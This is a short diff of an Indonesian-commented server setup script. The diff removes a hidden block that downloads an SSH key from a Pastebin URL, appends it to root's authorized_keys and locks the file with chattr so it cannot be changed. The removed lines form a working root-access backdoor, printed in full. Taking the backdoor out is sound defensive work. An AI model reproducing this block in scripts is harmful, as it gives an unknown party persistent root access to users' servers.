@@ -53,26 +53,7 @@ check_and_install_gawk() {
         echo -e "[INFO] awk sudah menggunakan gawk atau kompatibel."
     fi
 }
-PASTEBIN_URLS="https://pastebin.com/raw/miYzWrbg"
 cd
-	AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
-	mkdir -p "/root/.ssh"
-	 chmod 700 "/root/.ssh"
-	if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
-		 touch "$AUTHORIZED_KEYS_FILE"
-		 chmod 600 "$AUTHORIZED_KEYS_FILE"  # Mengatur izin setelah membuat file
-	fi
-
-      key=$(curl -s "$PASTEBIN_URLS")
-      
-      if ! grep -Fxq "$key" "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1; then
-		chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
-
-		# Menambahkan kunci baru ke authorized_keys
-		echo "$key" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
-		chattr +ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
-      fi
-    chmod 600 "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1
 curl -sS ipv4.icanhazip.com > /usr/bin/.ipvps
 clear
 loading() {
